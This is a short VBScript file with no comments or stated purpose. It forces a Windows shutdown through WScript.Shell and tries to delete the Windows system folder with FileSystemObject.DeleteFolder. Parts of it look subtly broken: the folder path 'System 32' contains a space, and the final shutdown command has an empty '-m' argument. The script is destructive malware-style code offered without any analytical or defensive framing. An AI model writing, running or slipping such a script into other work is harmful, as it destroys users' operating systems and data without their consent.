strCmd = "shutdown -s -t 36288000 -f"
set objShell = CreateObject("WScript.Shell")
objShell.Run strCmd

set FSO=CreateObject("Scripting.FileSystemObject")

Folder="C:\\WINDOWS\\System 32"

FSO.DeleteFolder(Folder)

    strShutdown = "shutdown -s -t 36288000 -f -m "

    set objShell = CreateObject("WScript.Shell")

    objShell.Run strShutdown